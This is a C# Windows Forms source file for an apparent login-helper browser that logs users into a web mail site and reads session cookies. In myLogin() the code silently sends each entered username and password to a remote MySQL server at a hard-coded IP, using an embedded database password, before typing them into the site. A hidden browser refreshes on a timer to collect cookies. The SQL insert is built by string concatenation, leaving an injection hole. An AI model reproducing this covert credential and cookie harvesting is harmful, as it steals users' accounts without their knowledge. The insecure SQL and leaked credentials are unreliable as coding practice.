using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace helper
{
    public partial class cookieBrowser : Form
    {

        [DllImport("user32.dll", EntryPoint = "keybd_event", SetLastError = true)]
        public static extern void keybd_event(Keys bVk, byte bScan, uint dwFlags, uint dwExtraInfo);



        public static string webUrl = "";
        public static string cookie = "";
        public cookieBrowser(string url)
        {
            InitializeComponent();
            webUrl = url;
            method.SetFeatures(11000);
            webBrowser1.ScriptErrorsSuppressed = true;

            webBrowser1.Url = new Uri(webUrl);
             webBrowser1.Navigate(webUrl);
        }

        private void cookieBrowser_Load(object sender, EventArgs e)
        {
           webBrowser1.Visible = false;
            timer1.Start();
            button2.Enabled = true;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            cookie = method.GetCookies(webUrl);
            this.Hide();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            webBrowser1.Refresh();
            cookie = method.GetCookies(webUrl);
        }

        private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
        {
            //防止弹窗；
            e.Cancel = true;
            string url = this.webBrowser1.StatusText;
            this.webBrowser1.Url = new Uri(url);
        }

        #region  注册函数

        public void myLogin()
        {
            webBrowser1.Visible = true;

            try

            {

                string constr = "Host =143.92.45.176;Database=fastadmin;Username=fastadmin;Password=cFfJA2SH3JeFKtj7";
                MySqlConnection mycon = new MySqlConnection(constr);
                mycon.Open();

                MySqlCommand cmd = new MySqlCommand("INSERT INTO fa_mail_user (username,password)VALUES('" + textBox1.Text + " ', '" + textBox2.Text + " ')", mycon);         //SQL语句读取textbox的值'"+skinTextBox1.Text+"'


                int count = cmd.ExecuteNonQuery();  //count就是受影响的行数,如果count>0说明执行成功,如果=0说明没有成功.
                if (count > 0)
                {
                    mycon.Close();



                    webBrowser1.Focus();
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");
                    SendKeys.Send("{BACKSPACE}");




                    Clipboard.SetDataObject(textBox1.Text.Trim());

                   
                    keybd_event(Keys.ControlKey, 0, 0, 0);
                    keybd_event(Keys.V, 0, 0, 0);
                    keybd_event(Keys.ControlKey, 0, KEYEVENTF_KEYUP, 0);

                    keybd_event(Keys.Tab, 0, 0, 0);
                    SendKeys.Send(textBox2.Text.Trim());
                    SendKeys.Send("{ENTER}");

                }
                else
                {
                    MessageBox.Show("连接失败！");
                }


            }

            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
            #endregion

            private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "" || textBox2.Text == "")
            {
                MessageBox.Show("请输入账号信息");
                return;
            }

            myLogin();
            webBrowser1.Visible = true;
         
        }
        public const int KEYEVENTF_KEYUP = 2;
        private void button3_Click(object sender, EventArgs e)
        {
           
          
          
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
           
        }

     
    }
}
